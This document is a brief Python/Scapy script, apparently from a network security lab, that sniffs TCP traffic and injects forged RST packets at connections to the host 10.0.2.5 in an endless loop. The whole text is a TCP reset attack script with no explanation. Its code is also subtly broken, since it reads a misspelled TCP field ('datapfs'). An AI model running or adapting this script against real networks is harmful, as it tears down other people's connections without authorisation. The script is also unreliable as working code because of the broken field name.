from scapy.all import *

def reset_pkt(pkt):
	if pkt[IP].dst == "10.0.2.5":
		payload_length = pkt[IP].len - 20 - 4*pkt[TCP].datapfs
		seq = pkt[TCP].seq + (payload_length if payload_length!=0 else 1)
		ip = IP(src=pkt[IP].src, dst="10.0.2.5")
		tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="R", seq=seq)
		pkt = ip/tcp
		ls(pkt)
		send(pkt, verbose=0)
		print("sent\n")

while 1==1:
	pkt = sniff(filter="tcp", prn=reset_pkt)
